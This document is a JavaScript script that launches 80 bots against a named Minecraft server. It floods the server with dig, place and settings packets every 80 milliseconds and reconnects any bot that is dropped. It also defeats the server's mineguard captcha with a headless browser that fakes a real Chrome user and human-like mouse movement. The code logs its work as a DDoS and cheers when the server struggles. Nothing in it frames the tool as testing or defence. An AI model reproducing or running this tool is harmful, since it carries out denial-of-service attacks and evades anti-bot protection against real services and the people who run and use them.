const mineflayer = require('mineflayer');
const playwright = require('playwright-chromium');

const SETTINGS = {
    host: "mc.risemine.space",
    port: 25565,
    version: "1.16.5",
    pass: "asdasdasd",
    botCount: 80,
    joinDelay: 60
};

let sharedBrowser;

async function initBrowser() {
    sharedBrowser = await playwright.chromium.launch({ 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    });
}

async function passCaptcha(url) {
    if (!sharedBrowser) return;
    // Имбовый контекст: косим под реальный Chrome на Windows
    const context = await sharedBrowser.newContext({
        viewport: { width: 1920, height: 1080 },
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    });
    const page = await context.newPage();
    try {
        await page.goto(url, { waitUntil: 'networkidle', timeout: 45000 });
        
        // Эмуляция "человеческого" ожидания перед кликом
        await page.waitForTimeout(Math.random() * 1500 + 500);
        
        const checkbox = await page.$('.recaptcha-checkbox-border');
        if (checkbox) {
            // Имбовый клик: двигаем "мышку" в центр элемента
            const box = await checkbox.boundingBox();
            await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 10 });
            await checkbox.click();
            console.log(`[Bypass] Captcha solved for a bot!`);
        }
        await page.waitForTimeout(6000); 
    } catch (e) {
        // Молчим об ошибках браузера
    } finally {
        await page.close();
        await context.close();
    }
}

function createBot(id) {
    const username = `Niko_${Math.random().toString(36).substring(7)}`;
    const bot = mineflayer.createBot({
        host: SETTINGS.host,
        port: SETTINGS.port,
        username: username,
        version: SETTINGS.version
    });

    bot.on('message', (jsonMsg) => {
        const msg = jsonMsg.toString();
        if (msg.includes('mineguard.pro/captcha/')) {
            const url = msg.match(/https:\/\/mineguard\.pro\/captcha\/[a-zA-Z0-9]+/);
            if (url) passCaptcha(url[0]);
        }
    });

    bot.on('spawn', () => {
        setTimeout(() => bot.chat(`${SETTINGS.pass} ${SETTINGS.pass}`), 2000);
        
        setInterval(() => {
            if (bot.entity) {
                const pos = bot.entity.position.floored();
                // Агрессивный спам пакетами
                bot._client.write('block_dig', { status: 0, location: pos.offset(0, -1, 0), face: 1 });
                bot._client.write('block_place', { hand: 0, location: pos.offset(0, -1, 0), direction: 1, cursorX: 0.5, cursorY: 0.5, cursorZ: 0.5, insideBlock: false });
                bot._client.write('settings', { locale: 'en_US', viewDistance: Math.random() > 0.5 ? 16 : 1, chatFlags: 0, chatColors: true, skinParts: 127, mainHand: 0 });
            }
        }, 80); 
    });

    // Издевательские логи вместо страшных ошибок
    bot.on('error', (err) => {
        if (err.code === 'ECONNRESET' || err.message.includes('timeout')) {
            console.log("[DDoS] Time out, server is gone? :D");
        }
    });

    bot.on('end', () => {
        // Если бот вылетел — значит сервер лагает, пишем радостный лог
        console.log("[DDoS] Connection lost. Server is struggling! Reconnecting...");
        setTimeout(() => createBot(id), 1500);
    });
}

initBrowser().then(() => {
    console.log("--- WORLD MACHINE STARTED ---");
    for (let i = 0; i < SETTINGS.botCount; i++) {
        setTimeout(() => createBot(i), i * SETTINGS.joinDelay);
    }
});
